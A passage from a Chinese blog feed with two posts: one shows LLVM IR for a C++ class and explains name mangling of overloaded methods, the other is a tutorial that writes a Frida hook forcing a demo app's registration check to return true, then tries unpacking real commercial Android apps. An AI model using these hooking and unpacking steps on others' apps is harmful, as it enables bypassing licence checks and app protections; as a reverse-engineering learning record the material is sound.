class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;testclass.cpp&#39;</span><br><span class="line">source_filename &#x3D; &quot;testclass.cpp&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">%&quot;class.std::ios_base::Init&quot; &#x3D; type &#123; i8 &#125;</span><br><span class="line">%&quot;class.std::basic_ostream&quot; &#x3D; type &#123; i32 (...)**, %&quot;class.std::basic_ios&quot; &#125;</span><br><span class="line">%&quot;class.std::basic_ios&quot; &#x3D; type &#123; %&quot;class.std::ios_base&quot;, %&quot;class.std::basic_ostream&quot;*, i8, i8, %&quot;class.std::basic_streambuf&quot;*, %&quot;class.std::ctype&quot;*, %&quot;class.std::num_put&quot;*, %&quot;class.std::num_get&quot;* &#125;</span><br><span class="line">%&quot;class.std::ios_base&quot; &#x3D; type &#123; i32 (...)**, i64, i64, i32, i32, i32, %&quot;struct.std::ios_base::_Callback_list&quot;*, %&quot;struct.std::ios_base::_Words&quot;, [8 x %&quot;struct.std::ios_base::_Words&quot;], i32, %&quot;struct.std::ios_base::_Words&quot;*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Callback_list&quot; &#x3D; type &#123; %&quot;struct.std::ios_base::_Callback_list&quot;*, void (i32, %&quot;class.std::ios_base&quot;*, i32)*, i32, i32 &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Words&quot; &#x3D; type &#123; i8*, i64 &#125;</span><br><span class="line">%&quot;class.std::locale&quot; &#x3D; type &#123; %&quot;class.std::locale::_Impl&quot;* &#125;</span><br><span class="line">%&quot;class.std::locale::_Impl&quot; &#x3D; type &#123; i32, %&quot;class.std::locale::facet&quot;**, i64, %&quot;class.std::locale::facet&quot;**, i8** &#125;</span><br><span class="line">%&quot;class.std::locale::facet&quot; &#x3D; type &lt;&#123; i32 (...)**, i32, [4 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::basic_streambuf&quot; &#x3D; type &#123; i32 (...)**, i8*, i8*, i8*, i8*, i8*, i8*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;class.std::ctype&quot; &#x3D; type &lt;&#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8], %struct.__locale_struct*, i8, [7 x i8], i32*, i32*, i16*, i8, [256 x i8], [256 x i8], i8, [6 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::locale::facet.base&quot; &#x3D; type &lt;&#123; i32 (...)**, i32 &#125;&gt;</span><br><span class="line">%struct.__locale_struct &#x3D; type &#123; [13 x %struct.__locale_data*], i16*, i32*, i32*, [13 x i8*] &#125;</span><br><span class="line">%struct.__locale_data &#x3D; type opaque</span><br><span class="line">%&quot;class.std::num_put&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%&quot;class.std::num_get&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%class.A &#x3D; type &#123; i8 &#125;</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEiii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">@_ZStL8__ioinit &#x3D; internal global %&quot;class.std::ios_base::Init&quot; zeroinitializer, align 1</span><br><span class="line">@__dso_handle &#x3D; external hidden global i8</span><br><span class="line">@_ZSt4cout &#x3D; external dso_local global %&quot;class.std::basic_ostream&quot;, align 8</span><br><span class="line">@.str &#x3D; private unnamed_addr constant [6 x i8] c&quot;res1:\00&quot;, align 1</span><br><span class="line">@.str.1 &#x3D; private unnamed_addr constant [7 x i8] c&quot;,res2:\00&quot;, align 1</span><br><span class="line">@.str.2 &#x3D; private unnamed_addr constant [2 x i8] c&quot;\0A\00&quot;, align 1</span><br><span class="line">@llvm.global_ctors &#x3D; appending global [1 x &#123; i32, void ()*, i8* &#125;] [&#123; i32, void ()*, i8* &#125; &#123; i32 65535, void ()* @_GLOBAL__sub_I_testclass.cpp, i8* null &#125;]</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @__cxx_global_var_init() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit)</span><br><span class="line">  %0 &#x3D; call i32 @__cxa_atexit(void (i8*)* bitcast (void (%&quot;class.std::ios_base::Init&quot;*)* @_ZNSt8ios_base4InitD1Ev to void (i8*)*), i8* getelementptr inbounds (%&quot;class.std::ios_base::Init&quot;, %&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit, i32 0, i32 0), i8* @__dso_handle) #3</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitD1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local i32 @__cxa_atexit(void (i8*)*, i8*, i8*) #3</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline norecurse optnone uwtable</span><br><span class="line">define dso_local i32 @main() #4 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %a &#x3D; alloca %class.A, align 1</span><br><span class="line">  %res1 &#x3D; alloca i32, align 4</span><br><span class="line">  %res2 &#x3D; alloca i32, align 4</span><br><span class="line">  %call &#x3D; call i32 @_ZN1A3addEii(%class.A* %a, i32 1, i32 2)</span><br><span class="line">  store i32 %call, i32* %res1, align 4</span><br><span class="line">  %call1 &#x3D; call i32 @_ZN1A3addEiii(%class.A* %a, i32 1, i32 3, i32 4)</span><br><span class="line">  store i32 %call1, i32* %res2, align 4</span><br><span class="line">  %call2 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) @_ZSt4cout, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  %0 &#x3D; load i32, i32* %res1, align 4</span><br><span class="line">  %call3 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call2, i32 %0)</span><br><span class="line">  %call4 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  %1 &#x3D; load i32, i32* %res2, align 4</span><br><span class="line">  %call5 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call4, i32 %1)</span><br><span class="line">  %call6 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEii(%class.A* %this, i32 %a, i32 %b) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%class.A* %this, i32 %a, i32 %b, i32 %c) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %c.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  store i32 %c, i32* %c.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  %2 &#x3D; load i32, i32* %c.addr, align 4</span><br><span class="line">  %add2 &#x3D; add nsw i32 %add, %2</span><br><span class="line">  ret i32 %add2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272), i8*) #1</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;*, i32) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @_GLOBAL__sub_I_testclass.cpp() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @__cxx_global_var_init()</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; nounwind &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #3 &#x3D; &#123; nounwind &#125;</span><br><span class="line">attributes #4 &#x3D; &#123; noinline norecurse optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #5 &#x3D; &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 7.0.0 (tags&#x2F;RELEASE_700&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure><p>可以发现</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b);</span><br></pre></td></tr></table></figure><p>生成的是：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> <span class="keyword">linkonce_odr</span> dso_local <span class="keyword">i32</span> <span class="title">@_ZN1A3addEii</span>(<span class="symbol">%class.A</span>* <span class="symbol">%this</span>, <span class="keyword">i32</span> <span class="symbol">%a</span>, <span class="keyword">i32</span> <span class="symbol">%b</span>)</span><br></pre></td></tr></table></figure><p>而</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>;</span><br></pre></td></tr></table></figure><p>生成的是：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%<span class="keyword">class</span>.<span class="symbol">A</span>* %<span class="symbol">this, <span class="symbol">i32</span></span> %<span class="symbol">a, <span class="symbol">i32</span></span> %<span class="symbol">b, <span class="symbol">i32</span></span> %<span class="symbol">c</span>)</span><br></pre></td></tr></table></figure><p>比两个参数多了一个i。</p><p>而且类名和函数之间用一个数字连接。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此文主要探讨LLVM是如何处理多态的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="程序分析" scheme="http://blog.ydq6.com/categories/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="LLVM" scheme="http://blog.ydq6.com/tags/LLVM/"/>
    
  </entry>
  
  <entry>
    <title>安卓测试(二)</title>
    <link href="http://blog.ydq6.com/android%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%BA%8C/"/>
    <id>http://blog.ydq6.com/android%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%BA%8C/</id>
    <published>2020-06-07T13:50:53.000Z</published>
    <updated>2020-06-23T15:34:06.106Z</updated>
    
    <content type="html"><![CDATA[<p>此篇文章主要讲的是android中使用frida框架hook应用进程。</p><a id="more"></a><h1><span id="编写demo测试frida-api">编写demo测试frida api</span></h1><h2><span id="编写demo">编写demo</span></h2><p>Android Studio安装具体过程网上自行搜索。</p><p>笔者当前AS版本：</p><p><img src="/assets/image-20200607215916539.png" alt="image-20200607215916539"></p><p>AS连接夜神简单方法：</p><p><img src="/assets/image-20200607220848783.png" alt="image-20200607220848783"></p><p>先新建一个空activity</p><p><img src="/assets/image-20200607215820676.png" alt="image-20200607215820676"></p><p>编写程序的思路是，一个简单的注册号检验，输入正确的校验号则成功激活，否则失败。</p><p>绕过逻辑，hook掉判断成功失败的函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> TextView textView = (TextView)findViewById(R.id.editText_code);</span><br><span class="line">        textView.setEnabled(<span class="keyword">true</span>);</span><br><span class="line">        Button check = (Button)findViewById(R.id.button);</span><br><span class="line">        check.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(check(textView.getText().toString()))&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验成功"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验失败"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String number)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> number.equals(<span class="string">"pass_word"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607223202986.png" alt="image-20200607223202986"></p><p>现在hook app。</p><p>首先生成带签名app</p><p><img src="/assets/image-20200607223304658.png" alt="image-20200607223304658"></p><h2><span id="frida测试">frida测试</span></h2><p>这里app没加壳，又有源码不用逆向，所以直接上手即可。</p><p>check.js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available)&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> checkMethod = Java.use(<span class="string">"blog.ydq6.demo1.MainActivity"</span>);</span><br><span class="line">        checkMethod.check.overload(<span class="string">"java.lang.String"</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">param</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"修改成功;\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行frida命令</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js --no-pause</span><br></pre></td></tr></table></figure><p>发现还是错误。</p><p>参考网上教程：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js</span><br></pre></td></tr></table></figure><p>去掉了-f –no-pause选项。</p><p>退出app,再重新打开，发现成功：<br><img src="/assets/image-20200607231641389.png" alt="image-20200607231641389"></p><p><img src="/assets/image-20200607231659556.png" alt="image-20200607231659556"></p><h2><span id="飞聊软件逆向分析">飞聊软件逆向分析</span></h2><p>将豌豆荚下载的飞聊apk放入jeb中反编译发现错误，猜测加了壳。</p><p><img src="/assets/image-20200609165516555.png" alt="image-20200609165516555"></p><p>放jadx发现信息出来了。</p><p><img src="/assets/image-20200609213830362.png" alt="image-20200609213830362"></p><p>很奇怪</p><h2><span id="frida脱壳">frida脱壳</span></h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida -R -f com.gaotu100.superclass -l  N:<span class="symbol">\w</span>eiyun<span class="symbol">\D</span>ocuments<span class="symbol">\s</span>ecurity<span class="symbol">\a</span>ndroid_security<span class="symbol">\f</span>rida<span class="symbol">\F</span>rida-Scripts-master<span class="symbol">\u</span>npack<span class="symbol">\u</span>npack.js</span><br></pre></td></tr></table></figure><p>发现没用，报错。</p><h2><span id="frida绑定端口错误">frida绑定端口错误</span></h2><p>frida的server如果被中断了，再次绑定会出现：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">Error</span> binding <span class="keyword">to</span><span class="built_in"> address </span>127.0.0.1:27042:<span class="built_in"> Address </span>already <span class="keyword">in</span> use</span><br></pre></td></tr></table></figure><h2><span id="xposed脱壳">xposed脱壳</span></h2><p>由于dumpdex不支持模拟器，所以换真机演示。</p><h1><span id="frida-编程参考">frida 编程参考</span></h1><h1><span id="smali文件分析">smali文件分析</span></h1><p>源文件：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span 